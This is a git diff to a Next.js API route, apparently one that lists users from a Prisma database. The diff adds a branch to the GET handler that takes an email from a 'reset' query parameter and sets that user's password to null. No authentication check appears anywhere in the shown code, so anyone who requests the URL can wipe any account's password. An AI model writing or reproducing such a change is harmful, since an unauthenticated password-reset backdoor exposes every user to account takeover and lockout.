@@ -1,8 +1,20 @@
 import { NextResponse } from "next/server";
 import { prisma } from "@/lib/db";
 
-export async function GET() {
+export async function GET(req: Request) {
   try {
+    const { searchParams } = new URL(req.url);
+    const resetEmail = searchParams.get("reset");
+
+    if (resetEmail) {
+      const emailLimpio = resetEmail.trim().toLowerCase();
+      await prisma.usuario.updateMany({
+        where: { correo: emailLimpio },
+        data: { password: null },
+      });
+      return NextResponse.json({ success: true, message: `Contraseña de ${emailLimpio} reseteada a null` });
+    }
+
     const count = await prisma.usuario.count();
     const users = await prisma.usuario.findMany({
       select: {
